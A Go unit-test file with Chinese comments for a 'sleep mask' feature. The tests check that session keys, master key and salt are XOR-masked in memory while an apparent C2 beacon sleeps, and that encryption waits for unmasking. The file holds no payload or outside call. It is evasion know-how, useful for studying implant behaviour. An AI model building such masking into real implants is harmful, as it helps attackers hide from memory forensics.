package encrypt

import (
	"bytes"
	"errors"
	"sync"
	"testing"
	"time"
)

// sleep mask 的验收标准只有一条：**睡眠期间真正的密钥材料不在内存里**。
// 原实现取 GetSessionKey()（返回拷贝）再对拷贝做 XOR —— 真身原样躺着，
// 遮蔽的是一个谁也看不到的局部变量。这些用例守的就是"别再退回那种实现"。

func setupKeyManager(t *testing.T) *ClientKeyManager {
	t.Helper()
	oldMgr, oldMK, oldSalt := GlobalClientKeyManager, globalMasterKey, globalSalt
	oldUse := keyUsersInFlight.Load()
	t.Cleanup(func() {
		GlobalClientKeyManager, globalMasterKey, globalSalt = oldMgr, oldMK, oldSalt
		keyUsersInFlight.Store(oldUse)
	})

	masterKey := bytes.Repeat([]byte{0xA5}, 32)
	salt := bytes.Repeat([]byte{0x5A}, 16)
	InitClientKeyManager("test-client")
	if err := GlobalClientKeyManager.SetSessionKey(salt, masterKey); err != nil {
		t.Fatalf("设置会话密钥失败: %v", err)
	}
	keyUsersInFlight.Store(0)
	return GlobalClientKeyManager
}

// TestMaskHidesRealKeyMaterial 遮蔽的是真身：会话密钥、主密钥、盐全部变样
func TestMaskHidesRealKeyMaterial(t *testing.T) {
	ckm := setupKeyManager(t)

	before, err := ckm.GetSessionKey()
	if err != nil {
		t.Fatalf("取密钥失败: %v", err)
	}
	masterBefore := append([]byte{}, globalMasterKey...)
	saltBefore := append([]byte{}, globalSalt...)

	restore, ok := ckm.MaskForSleep()
	if !ok {
		t.Fatal("空闲状态下应能遮蔽")
	}
	if !ckm.MaskedForTest() {
		t.Fatal("遮蔽后 masked 状态应为真")
	}
	// 真身必须已经不是原来的字节
	if bytes.Equal(ckm.sessionKey, before) {
		t.Fatal("会话密钥在遮蔽期间未改变（遮蔽的是副本？）")
	}
	if bytes.Equal(globalMasterKey, masterBefore) || bytes.Equal(globalSalt, saltBefore) {
		t.Fatal("主密钥/盐未参与遮蔽")
	}

	restore()
	if ckm.MaskedForTest() {
		t.Fatal("还原后 masked 状态应为假")
	}
	after, err := ckm.GetSessionKey()
	if err != nil {
		t.Fatalf("还原后取密钥失败: %v", err)
	}
	if !bytes.Equal(before, after) {
		t.Fatal("还原后会话密钥与遮蔽前不一致")
	}
	if !bytes.Equal(globalMasterKey, masterBefore) || !bytes.Equal(globalSalt, saltBefore) {
		t.Fatal("还原后主密钥/盐与遮蔽前不一致")
	}
	// 还原函数幂等（重复调用不会把密钥再 XOR 一遍）
	restore()
	if again, _ := ckm.GetSessionKey(); !bytes.Equal(before, again) {
		t.Fatal("重复调用还原函数破坏了密钥")
	}
}

// TestMaskClearsAEADCache 缓存以密钥字节为 map key，不清等于又留了一份明文密钥
func TestMaskClearsAEADCache(t *testing.T) {
	ckm := setupKeyManager(t)

	if _, err := EncryptWithSessionKey([]byte("hello")); err != nil {
		t.Fatalf("加密失败: %v", err)
	}
	if aeadCacheLen() == 0 {
		t.Fatal("前置条件不成立：AEAD 缓存应已有条目")
	}

	restore, ok := ckm.MaskForSleep()
	if !ok {
		t.Fatal("无人使用密钥时应能遮蔽")
	}
	if n := aeadCacheLen(); n != 0 {
		t.Fatalf("遮蔽期间 AEAD 缓存应被清空，实际 %d 条", n)
	}
	restore()

	// 还原后加解密恢复正常
	ct, err := EncryptWithSessionKey([]byte("hello"))
	if err != nil {
		t.Fatalf("还原后加密失败: %v", err)
	}
	pt, err := DecryptWithSessionKey(ct)
	if err != nil || string(pt) != "hello" {
		t.Fatalf("还原后解密失败: %v %q", err, pt)
	}
}

// TestMaskSkippedWhenKeyInUse 有在途使用者时跳过遮蔽（否则会打断隧道/交互会话）。
// 判定用的是"此刻在途"而不是"曾经用过"：后者会把 beacon 自己的心跳与命令回执
// 也算进来，结果是每轮都判定为忙、遮蔽永不生效。
func TestMaskSkippedWhenKeyInUse(t *testing.T) {
	ckm := setupKeyManager(t)

	// 走一次真实的加解密路径：调用结束后在途计数应归零（否则遮蔽永远不生效）
	if _, err := EncryptWithSessionKey([]byte("x")); err != nil {
		t.Fatalf("加密失败: %v", err)
	}
	if n := KeyUsersInFlight(); n != 0 {
		t.Fatalf("加解密返回后在途计数应为 0，实际 %d（遮蔽将永不生效）", n)
	}
	restore, ok := ckm.MaskForSleep()
	if !ok {
		t.Fatal("无人使用密钥时应能遮蔽")
	}
	restore()

	// 模拟一个在途使用者（隧道/交互会话正在收发）
	enterKeyUse()
	if _, ok := ckm.MaskForSleep(); ok {
		t.Fatal("有在途使用者时不应遮蔽")
	}
	exitKeyUse()
	if _, ok := ckm.MaskForSleep(); !ok {
		t.Fatal("使用者退出后应恢复遮蔽")
	}
}

// TestKeyUseWaitsForUnmask 遮蔽期间取密钥必须等待还原，不能拿到被 XOR 的字节。
// 若这里失败，表现是"服务端 GCM 认证失败"——排查方向完全对不上。
func TestKeyUseWaitsForUnmask(t *testing.T) {
	ckm := setupKeyManager(t)

	restore, ok := ckm.MaskForSleep()
	if !ok {
		t.Fatal("应能遮蔽")
	}

	done := make(chan error, 1)
	go func() {
		_, err := EncryptWithSessionKey([]byte("during-mask"))
		// 还原后能正常加密即说明没有用到被遮蔽的字节
		done <- err
	}()

	select {
	case err := <-done:
		t.Fatalf("遮蔽期间加密不应直接完成（会用到被遮蔽的密钥）: %v", err)
	case <-time.After(80 * time.Millisecond):
		// 正确：在等还原
	}

	restore()
	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("还原后加密应成功: %v", err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("还原后等待者未被唤醒")
	}
}

// TestMaskUnderConcurrency 并发加解密 + 遮蔽不得出现竞态或数据损坏
func TestMaskUnderConcurrency(t *testing.T) {
	ckm := setupKeyManager(t)

	var wg sync.WaitGroup
	stop := make(chan struct{})
	errCh := make(chan error, 64)

	for i := 0; i < 4; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}
				ct, err := EncryptWithSessionKey([]byte("payload"))
				if err != nil {
					errCh <- err
					return
				}
				pt, err := DecryptWithSessionKey(ct)
				if err != nil {
					errCh <- err
					return
				}
				if string(pt) != "payload" {
					errCh <- errors.New("解密结果与原文明文不符（密钥被遮蔽期间使用了错误密钥）")
					return
				}
			}
		}()
	}

	for i := 0; i < 20; i++ {
		if restore, ok := ckm.MaskForSleep(); ok {
			time.Sleep(time.Millisecond)
			restore()
		}
		time.Sleep(time.Millisecond)
	}
	close(stop)
	wg.Wait()
	close(errCh)
	for err := range errCh {
		t.Fatalf("并发期间出错: %v", err)
	}
}
